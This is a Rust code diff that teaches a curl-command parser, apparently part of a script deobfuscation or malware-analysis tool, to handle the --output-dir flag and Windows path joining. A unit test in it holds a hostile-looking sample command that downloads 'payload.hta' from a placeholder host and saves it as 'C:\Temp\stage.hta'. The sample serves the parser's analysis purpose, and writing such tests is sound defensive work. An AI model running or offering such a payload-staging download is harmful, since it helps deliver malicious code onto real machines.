@@ -3986,6 +3986,7 @@ fn is_known_non_curl_compact_flag_host(cmd_base: &str) -> bool {
 fn parse_curl_like_download(tokens: &[String]) -> Option<(String, Option<String>)> {
     let mut url: Option<String> = None;
     let mut dst: Option<String> = None;
+    let mut output_dir: Option<String> = None;
     let mut remote_name = false;
     let mut i = 1;
     while i < tokens.len() {
@@ -4024,11 +4025,29 @@ fn parse_curl_like_download(tokens: &[String]) -> Option<(String, Option<String>
             i += 2;
             continue;
         }
+        if curl_flag_matches_ci(raw_token, "--output-dir") {
+            let Some(next) = tokens.get(i + 1) else {
+                i += 1;
+                continue;
+            };
+            output_dir = Some(next.trim_matches(['"', '\'', ')']).to_string());
+            i += 2;
+            continue;
+        }
         if let Some(rest) = strip_ascii_case_insensitive_prefix(raw_token, "--output=")
             .or_else(|| strip_ascii_case_insensitive_prefix(raw_token, "--output:"))
         {
             if !rest.is_empty() {
                 dst = Some(rest.trim_matches(['"', '\'', ')']).to_string());
+            }
+            i += 1;
+            continue;
+        }
+        if let Some(rest) = strip_ascii_case_insensitive_prefix(raw_token, "--output-dir=")
+            .or_else(|| strip_ascii_case_insensitive_prefix(raw_token, "--output-dir:"))
+        {
+            if !rest.is_empty() {
+                output_dir = Some(rest.trim_matches(['"', '\'', ')']).to_string());
             }
             i += 1;
             continue;
@@ -4084,9 +4103,37 @@ fn parse_curl_like_download(tokens: &[String]) -> Option<(String, Option<String>
         i += 1;
     }
     url.map(|u| {
-        let dst = dst.or_else(|| remote_name.then(|| url_basename(&u)).flatten());
+        let dst = dst
+            .map(|path| resolve_curl_output_path(output_dir.as_deref(), path))
+            .or_else(|| {
+                remote_name
+                    .then(|| {
+                        url_basename(&u).map(|name| {
+                            output_dir
+                                .as_deref()
+                                .map(|dir| join_windows_path(dir, &name))
+                                .unwrap_or(name)
+                        })
+                    })
+                    .flatten()
+            });
         (u, dst)
     })
+}
+
+fn resolve_curl_output_path(output_dir: Option<&str>, output: String) -> String {
+    output_dir
+        .filter(|_| !is_windows_rooted_path(&output))
+        .map(|dir| join_windows_path(dir, &output))
+        .unwrap_or(output)
+}
+
+fn is_windows_rooted_path(path: &str) -> bool {
+    let bytes = path.as_bytes();
+    path.starts_with(['\\', '/'])
+        || bytes
+            .get(0..2)
+            .is_some_and(|head| head[0].is_ascii_alphabetic() && head[1] == b':')
 }
 
 fn normalize_curl_url_token(token: &str) -> Option<String> {
@@ -4309,10 +4356,27 @@ fn normalize_curl_text(curl_text: &str) -> std::borrow::Cow<'_, str> {
         out.insert(prefix_len, ' ');
     }
 
-    for needle in ["http://", "https://", "ftp://", "file://", "--output", "-o"] {
+    for needle in [
+        "http://",
+        "https://",
+        "ftp://",
+        "file://",
+        "--output-dir",
+        "--output",
+        "-o",
+    ] {
         let mut search_start = 0;
         while let Some(pos) = find_ascii_case_insensitive_from(&out, needle, search_start) {
             let is_scheme = matches!(needle, "http://" | "https://" | "ftp://" | "file://");
+            if needle == "--output"
+                && out
+                    .as_bytes()
+                    .get(pos + needle.len())
+                    .is_some_and(|b| *b == b'-')
+            {
+                search_start = pos + needle.len();
+                continue;
+            }
             if needle == "-o"
                 && pos > 0
                 && !out
@@ -9331,6 +9395,21 @@ mod curl_redirect_parser_tests {
             Some((
                 "https://curl-url-equals.example/payload.bin".to_string(),
                 Some("out.bin".to_string())
+            ))
+        );
+    }
+
+    #[test]
+    fn parse_curl_like_download_joins_output_dir_with_relative_output() {
+        let normalized = normalize_curl_text(
+            r#"curl --output-dir C:\Temp -o stage.hta https://curl-output-dir-o-deob.example/payload.hta"#,
+        );
+        let tokens = split_words(&normalized);
+        assert_eq!(
+            parse_curl_like_download(&tokens),
+            Some((
+                "https://curl-output-dir-o-deob.example/payload.hta".to_string(),
+                Some(r#"C:\Temp\stage.hta"#.to_string())
             ))
         );
     }
